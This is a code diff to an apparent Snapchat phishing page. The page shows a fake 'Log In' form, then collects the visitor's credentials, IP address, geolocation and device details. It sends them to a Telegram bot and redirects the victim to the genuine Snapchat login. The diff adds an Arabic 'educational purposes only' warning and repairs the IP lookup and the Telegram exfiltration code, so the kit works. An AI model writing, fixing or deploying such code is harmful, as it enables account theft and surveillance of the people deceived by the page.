@@ -19,6 +19,11 @@
   <div class="login-container">
     <h1>Log In</h1>
 
+    <!-- تحذير للمستخدم -->
+    <div class="warning">
+      <p>⚠️ <strong>تحذير:</strong> هذه الصفحة لأغراض تعليمية فقط. لا تدخل معلوماتك الشخصية الحقيقية.</p>
+    </div>
+
     <!-- نموذج تسجيل الدخول -->
     <form id="login-form">
       <label for="username">USERNAME OR EMAIL</label>
@@ -81,12 +86,12 @@
         const ramSize = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
 
         // الحصول على عنوان IP
-          axios.get(`https://ip-api.com/json/${ip}`)
+        axios.get('https://api.ipify.org?format=json')
             .then(response => {
                 const ip = response.data.ip;
 
                 // الحصول على معلومات الموقع الجغرافي
-                axios.get(`http://ip-api.com/json/${ip}`)
+                axios.get(`https://ip-api.com/json/${ip}`)
                     .then(locResponse => {
                         const country = locResponse.data.country || 'Unknown';
                         const city = locResponse.data.city || 'Unknown';
@@ -110,27 +115,23 @@ RAM Size: ${ramSize}
                         `;
 
                         // إرسال البيانات إلى تيليجرام
-                       axios.post(URI_API, {
-     chat_id: CHAT_ID,
-    parse_mode: 'html',
-    text: message
-}).then(() => {
-    console.log("تم إرسال البيانات بنجاح!");
-    window.location.href = "https://accounts.snapchat.com/accounts/login";
-}).catch(error => {
-    console.error("خطأ في إرسال البيانات إلى تيليجرام:", error);
-});
+                        axios.post(URI_API, {
+                            chat_id: CHAT_ID,
+                            parse_mode: 'html',
+                            text: message
+                        }).then(() => {
+                            console.log("تم إرسال البيانات بنجاح!");
                             window.location.href = "https://accounts.snapchat.com/accounts/login";
+                        }).catch(error => {
+                            console.error("خطأ في إرسال البيانات إلى تيليجرام:", error);
                         });
                     })
                     .catch(error => {
                         console.error("خطأ في جلب بيانات الموقع الجغرافي:", error);
-                        window.location.href = "https://accounts.snapchat.com/accounts/login";
                     });
             })
             .catch(error => {
                 console.error("خطأ في جلب عنوان IP:", error);
-                window.location.href = "https://accounts.snapchat.com/accounts/login";
             });
     });
   </script>
